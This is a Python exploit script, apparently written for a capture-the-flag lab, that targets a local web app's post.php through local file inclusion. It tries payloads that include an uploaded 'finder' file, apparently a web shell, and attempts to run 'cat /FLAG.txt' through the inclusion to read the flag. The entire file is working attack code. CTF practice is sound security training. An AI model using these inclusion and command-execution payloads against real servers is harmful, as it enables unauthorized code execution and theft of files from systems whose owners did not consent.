import requests

base_url = "http://127.0.0.1:32891"

print("[+] Trying to include finder.php through post.php LFI...")

# Try to include uploads/finder without .php extension (maybe .md is appended)
# Or try to include it in a way that lets us pass parameters

include_payloads = [
    "uploads/finder",  # Without extension
    "uploads/finder.php",  # With extension (might get .md appended = .php.md)
]

for payload in include_payloads:
    print(f"\n[+] Testing: {payload}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
    
    # Check if we got execution
    if len(resp.text) > 5000:  # Larger than normal
        print("Got large response!")
        if "FLAG{" in resp.text:
            print(f"[!!!] FOUND FLAG!")
            print(resp.text)
            break
        else:
            print(f"Content preview (first 500 chars):")
            print(resp.text[:500])
    elif "total 84" in resp.text:  # Directory listing from finder.php
        print("Got directory listing from finder.php!")
        print(resp.text)
    else:
        print(f"Preview: {resp.text[:200]}")

# What if I need to pass parameters through the LFI?
print("\n[+] Trying to include finder.php WITH parameters...")

# PHP can sometimes pass query parameters through includes
parameterized_payloads = [
    "uploads/finder?cmd=cat /FLAG.txt",
    "uploads/finder&cmd=cat /FLAG.txt",
]

for payload in parameterized_payloads:
    print(f"\n[+] Testing: {payload}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG!")
        print(resp.text)
        break
    else:
        print(f"Status: {resp.status_code} | Length: {len(resp.text)}")

